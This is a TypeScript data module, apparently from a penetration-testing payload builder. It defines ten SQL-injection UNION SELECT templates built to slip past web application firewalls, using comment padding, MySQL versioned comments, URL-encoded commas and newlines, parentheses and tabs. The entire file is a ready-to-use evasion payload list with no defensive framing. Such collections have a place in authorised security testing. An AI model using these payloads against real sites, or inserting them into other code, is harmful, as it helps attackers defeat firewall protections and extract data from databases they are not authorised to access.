import { BuilderSubcategory } from '../../types';

export const unionSubcategory: BuilderSubcategory = {
  id: 'union',
  label: 'Union statement',
  description: 'WAF bypass UNION query structure and comment syntax templates',
  templates: [
    {
      id: 'waf-union-comment-select',
      name: 'UNION/**/SELECT/**/1,2,3,4,5',
      content: 'UNION/**/SELECT/**/1,2,3,4,5'
    },
    {
      id: 'waf-union-version-comment-select',
      name: '/*!50000UNION*//**//*!50000SELECT*/1,2,3,4,5',
      content: '/*!50000UNION*//**//*!50000SELECT*/1,2,3,4,5'
    },
    {
      id: 'waf-union-all-comment-select',
      name: 'UNION/**/ALL/**/SELECT/**/1,2,3,4,5',
      content: 'UNION/**/ALL/**/SELECT/**/1,2,3,4,5'
    },
    {
      id: 'waf-union-all-version-comment-select',
      name: '/*!50000UNION*//*!50000ALL*//*!50000SELECT*/1,2,3,4,5',
      content: '/*!50000UNION*//*!50000ALL*//*!50000SELECT*/1,2,3,4,5'
    },
    {
      id: 'waf-union-select-parens',
      name: 'UNION(SELECT(1),(2),(3),(4),(5))',
      content: 'UNION(SELECT(1),(2),(3),(4),(5))'
    },
    {
      id: 'waf-union-null-comment',
      name: 'UNION/**/SELECT/**/null,null,null',
      content: 'UNION/**/SELECT/**/null,null,null'
    },
    {
      id: 'waf-union-comment-newline',
      name: 'UNION/**/SELECT/**/1/**/%0A,2/**/%0A,3/**/%0A',
      content: 'UNION/**/SELECT/**/1/**/%0A,2/**/%0A,3/**/%0A'
    },
    {
      id: 'waf-union-encoded-comma',
      name: 'UNION/**/SELECT/**/1%2c2%2c3%2c4%2c5',
      content: 'UNION/**/SELECT/**/1%2c2%2c3%2c4%2c5'
    },
    {
      id: 'waf-union-version-parens',
      name: '/*!50000UNION*//**//*!50000SELECT*//*!50000(1)*/,/*!50000(2)*/',
      content: '/*!50000UNION*//**//*!50000SELECT*//*!50000(1)*/,/*!50000(2)*/,/*!50000(3)*/'
    },
    {
      id: 'waf-union-tab-separated',
      name: 'UNION\tSELECT\t1,2,3,4,5',
      content: 'UNION\tSELECT\t1,2,3,4,5'
    }
  ]
};

